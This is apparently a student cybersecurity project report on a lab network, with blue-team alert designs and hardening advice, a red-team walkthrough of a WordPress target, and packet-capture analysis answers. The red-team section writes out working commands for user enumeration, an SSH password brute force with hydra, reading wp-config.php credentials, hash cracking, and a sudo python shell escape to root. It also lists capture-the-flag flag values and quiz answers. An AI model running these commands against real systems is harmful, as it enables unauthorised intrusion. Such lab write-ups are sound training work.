# Attack, Defense & Analysis of a Vulnerable Network

## Table of Contents

1. [Network Topology](#network-topology)
2. [Blue Team: Summary of Operations](#blue-team-summary-of-operations)
   1. [Description of Targets](#description-of-targets)
   2. [Monitoring the Targets](#monitoring-the-targets)
   3. [Suggestions for Going Further](#suggestions-for-going-further)
3. [Red Team: Summary of Operations](#red-team-summary-of-operations)
   1. [Exposed Services](#exposed-services)
   2. [Critical Vulnerabilities](#critical-vulnerabilities)
   3. [Exploitation](#exploitation) 
4. [Network Analysis](#network-analysis)
   1. [Time Thieves](#time-thieves)
   2. [Vulnerable Windows Machines](#vulnerable-windows-machines)

## Network Topology

The following machines were identified on the network:

| Virtual machine  | OS         | IP Address    | Purpose         |
|------------------|------------|---------------|-----------------|
| Hyper-V          | Windows 10 | 192.168.1.1   | Hyper-V host    |
| Kali             | Linux      | 192.168.1.90  | Attacking host  |
| ELK              | Linux      | 192.168.1.100 | Monitoring host |
| Capstone         | Linux      | 192.168.1.105 | Victim host     |
| Target 1         | Linux      | 192.168.1.110 | Victim host     |
| Target 2         | Linux      |   | |

![Network Topology image]()

# Blue Team: Summary of Operations

## Description of Targets

The target of this attack was: Target 1 (192.168.1.110).

Target 1 is an Apache web server and has SSH enabled, so ports 80 and 22 are possible ports of entry for attackers. As such, the following alerts have been Implemented: 

## Monitoring the Targets

Traffic to these services should be carefully monitored. To this end, we have implemented the alerts below: 

- ### Excessive HTTP Errors

The excessive HTTP errors alert is implemented as follows:

- Metric: HTTP response code
- Threshold: codes above 400
- Vulnerability Mitigated: Brute force/Enumeration.
- Reliability: High reliability, when we measure by HTTP response status code we can filter possible errors. Response codes between 400 and 599 are client and server error codes. A response code within this range could indicate an attack.

![Excessive HTTP errors image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Blue/Excessive%20HTTP%20Errors%20-%20alert%20history.png)

- ### HTTP Request Size Monitor

The HTTP request size monitor alert is implemented as follows:

- Metric: HTTP request bytes
- Threshold: Above 3500
- Vulnerability Mitigated: DDoS and Code Injection in the HTTP request (XSS). 
- Reliability: Low reliability, the alert is prone to frequent false positives as there are non-malicious requests above 3500 bytes as we can see from the image below. This alert will need more testing to determine the correct threshold for it to be more reliable.

![HTTP request size image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Blue/HTTP%20Request%20Size%20Monitor%20-%20alert%20history.png)

- ### CPU Usage Monitor

The CPU usage monitor alert is implemented as follows:

- Metric: Total amount of system CPU usage by processes
- Threshold: above 0.5 (50%)
- Vulnerability Mitigated: Malicious software/programs using CPU resources.
- Reliability: High reliability, measured by CPU usage allows us to determine if malware is attempting to compromise the system.

![CPU Usage image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Blue/CPU%20Usage%20Monitor%20-%20alert%20history.png)

## Suggestions for Going Further

The logs and alerts generated during the assessment suggest that this network is susceptible to several active threats, identified by the alerts above. In addition to watching for occurrences of such threats, the network should be hardened against them. The Blue Team suggests that IT implement the fixes below to protect the network:

- WordPress user enumeration
   - Patch: WordPress information obfuscation
   - Why it Works: Removing or disabling files containing sensitive information can slow down attackers when attempting to gather information regarding the platform. A few of the files that will need to be re-configured are:
     - xmlrpc.php
     - ?authors=
     - readme.html
     - wp-cron.php  

- Vulnerable SSH Authentication
   - Patch: MFA implementation
   - Why it Works: MFA prevents brute force attacks by requiring a second authentication factor to successfully use login credentials.

- Server Sensitive Data Exposure
   - Patch: Restric access to the wp-config.php file
   - Why it Works: the file has a default location by moving the file to a file outside of the WordPress installation and restricting file permissions we can ensure it is not accessed by unauthorized users.

- MySQL Access
   - Patch: Implement encryption protocol/MFA
   - Why it Works: By using encryption protocols, data breaches are less likely to happen. Cybercriminals are therefore unable to access the data even if they get their hands on it. multi-factor authentication will also prevent any unauthorized user from accessing the database directly.

# Red Team: Summary of Operations

## Exposed Services

Nmap scan results for the target machine reveal the below services and OS details:

![nmap scan image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Red/nmap%20-Pn%20-sV%20192.168.1.110.png)

This scan identifies the services below as potential points of entry:

| Port | Service     |
|------|-------------|
| 22   | SSH         |
| 80   | HTTP        |
| 111  | rpcbind     |
| 139  | netbios-ssn |
| 445  | netbios-ssn |

The following vulnerabilities were identified on each target:

- Target 1

| Vulnerability                 | Severity | CVE           |
|-------------------------------|----------|---------------|
| WordPress Enumeration         | Medium   | CVE-2009-2335 |
| Vulnerable SSH Authentication | High     | CVE-2022-1039 |
| Sensitive Data Exposure       | High     | N/A           |
| MySQL Access                  | High     | N/A           |

![WordPress scan image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Red/wpscan%20vulns.png)
![WordPress user scan image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Red/wpscan%20users.png)

## Exploitation

The Red Team was able to penetrate Target 1 and retrive the following confidential data:

### Target 1

- flag1.txt - flag1{b9bbccb33e11b80be759c4e844862482d}
  - Exploit Used
     - Used wpscan to enumerate wordpress users and access the system.
     - Identified user michael.
   - Commands: 
     - wpscan --url -e http://192.168.1.110/wordpress
     - hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh
   - Location of flag: /var/www/html/service.html
        
![flag1 image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Red/flag1.png)       

- flag2.txt - flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
  - Exploit Used
    - Used the same exploit as flag1.
    - Used wpscan to enumerate wordpress users and access the system.
    - Identified user michael.
    - Used hydra to brute force michael's password.
  - Commands:
    - wpscan --url -e http://192.168.1.110/wordpress
    - hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh
  - Location: /var/www/flag2.txt
    
![flag2 image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Red/flag2.png)    

- flag3.txt - flag3{afc01ab56b50591e7dccf93122770cd2}
  - Exploit Used
    - Found wordpress dabatase credentials in wordpress installation.
    - Used credentials to login and access database tables
  - Commands:
    - cd /var/www/html/wordpress/wp-config.php
    - cat wp-config.php
    - mysql -u root -p wordpress
    - use wordpress
    - SELECT * FROM wp_posts WHERE post_content LIKE 'flag3%';
  - Location: in wordpress database, wp_posts table
    
![flag3 image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Red/flag3.png)    

- flag4.txt - flag4{715dea6c055b9fe3337544932f2941ce}
  - Exploit Used 
    - Used john the ripper to crack steven's password.
    - Used SSH to connect with steven's credentials.
    - Identified sudo privileges for steven.
    - Used sudo privileges to gain root access
  - Commands: 
      - john --wordlist=usr/share/wordlists/rockyou.txt wp_hashes.txt
      - ssh steven@192.168.1.110
      - sudo -l
      - sudo python -c 'import os; os.system("/bin/bash")'
   - Location: /root/flag4.txt
   
![flag4 image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Red/flag4.png)

# Network Analysis

## Time Thieves

At least two users on the network have been wasting time on YouTube. Usually, IT wouldn't pay much mind to this behavior, but it seems these people have created their own web server on the corporate network. So far, Security knows the following about these time thieves:

- They have setup an Active Directory network.
- They are constantly watching videos on YouTube.
- Their IP addresses are somewhere in the range 10.6.12.0/24.

You must inspect your traffic capture to answer the following questions:

1. What is the domain name of the users custom site?

- Answer: Frank-n-Ted-DC.frank-n-ted.com

![Q1 image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Network%20Analysis/Domain%20Controller.png)

2. What is the IP address of the Domain Controller (DC) of the AD network?

- Answer: 10.6.12.12

![Q2 image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Network%20Analysis/dc_ip.png)

3. What is the name of the malware downloaded to the 10.6.12.203 machine? Once you have found the file, export it to your Kali machine's desktop.

- Answer: june11.dll

![Q3 image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Network%20Analysis/malicious%20file.png)

4. Upload the file to VirusTotal.com. What kind of malware is this classified as?

- Answer: the site classifed the malware as a Trojan.

![Q4 image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Network%20Analysis/virustotal.png)

## Vulnerable Windows Machines

The Security team received reports of an infected Windows host on the network. They know the following:

- Machines in the network live in the range 172.16.4.0/24.
- The domain mind-hammer.net is associated with the infected computer.
- The DC for this network lives at 172.16.4.4 and is named Mind-Hammer-DC.
- The network has standard gateway and broadcast addresses.

Inspect your traffic to answer the following questions:

1. Find the following information about the infected Windows machine:
- Host name: **ROTTERDAM-PC**
- IP address: **172.16.4.205**
- MAC address: **00:59:07:b0:63:a4**

![Q1 image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Network%20Analysis/infected%20machine.png)

2. What is the username of the Windows user whose computer is infected?

- matthijs.devries

![Q2 image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Network%20Analysis/infected%20user.png)

3. What are the IP addresses used in the actual infection traffic?

- Both 166.62.111.64 and 185.243.115.84 were used to infect the host machine.

![Q3 image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Network%20Analysis/infected%20traffic.png)

4. Retrieve the desktop background of the Windows host.

- ip.addr == 185.243.115.84 && http.request.method == POST

[Q4 command](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Network%20Analysis/desktop%20image.png)
[Q4 image]()
